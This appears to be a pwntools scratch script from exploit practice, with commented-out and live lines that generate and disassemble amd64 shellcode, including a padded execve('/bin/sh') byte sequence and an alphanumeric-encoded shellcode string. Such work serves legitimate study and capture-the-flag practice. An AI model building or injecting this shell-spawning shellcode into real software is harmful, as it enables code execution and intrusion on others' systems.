from pwn import *


#print(pwnlib.shellcraft.amd64.linux.syscall('SYS_execve', 1, 'rsp', 2, 0).rstrip())

with context.local():
    context.arch = 'amd64'
    #print(enhex(asm(shellcraft.pushstr("/bin/sh"))))

    #print(disasm(b"\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87"+
    #b"\x53\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x31\xC0\x3c\x0c"+
    #b"\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x3c\x87\x48"+
    #b"\xF7\xDB\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x53\x3c\x87"+
    #b"\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x54\x3c\x87\x3c\x87"+
    #b"\x3c\x87\x3c\x87\x3c\x87\x5F\x3c\x87\x3c\x87\x3c\x87"+
    #b"\x3c\x87\x3c\x87\x99\x3c\x87\x3c\x87\x3c\x87\x3c\x87"+
    #b"\x3c\x87\x52\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87"+
    #b"\x57\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x54\x3c"+
    #b"\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x5E\x3c\x87\x3c"+
    #b"\x87\x3c\x87\x3c\x87\x3c\x87\xB0\x3B\x3c\x87\x3c\x87"+
    #b"\x3c\x87\x3c\x0c\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c"+
    #b"\x87\x3c\x87\x0F\x05\x3c\x87\x3c\x87\x3c\x87\x3c\x0c") )
    
    print(disasm(b'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'))